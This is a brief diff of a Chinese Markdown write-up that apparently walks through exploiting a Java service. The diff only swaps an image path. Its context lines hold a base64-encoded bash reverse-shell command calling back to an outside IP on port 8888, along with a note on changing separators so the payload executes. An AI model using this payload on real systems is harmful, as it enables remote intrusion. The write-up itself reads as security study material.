@@ -83,7 +83,7 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGxxxxxxxxxxxxEuMjAwLjE0NC41NS84ODg4IDA+JjE=}|{bas
 知道问题了，我们可以将逗号分隔改为下划线分隔，并打包为jar包（如果仔细看上面的burp请求，会发现我已经在命令之间加了一个下划线）  
 
 再次执行后成功接收到反弹shell  
-![image](./pic/5.png)  
+![image](./pic/1.png)  
 
 ### 参考链接：  
 https://www.cnblogs.com/mutudou/p/14685277.html  
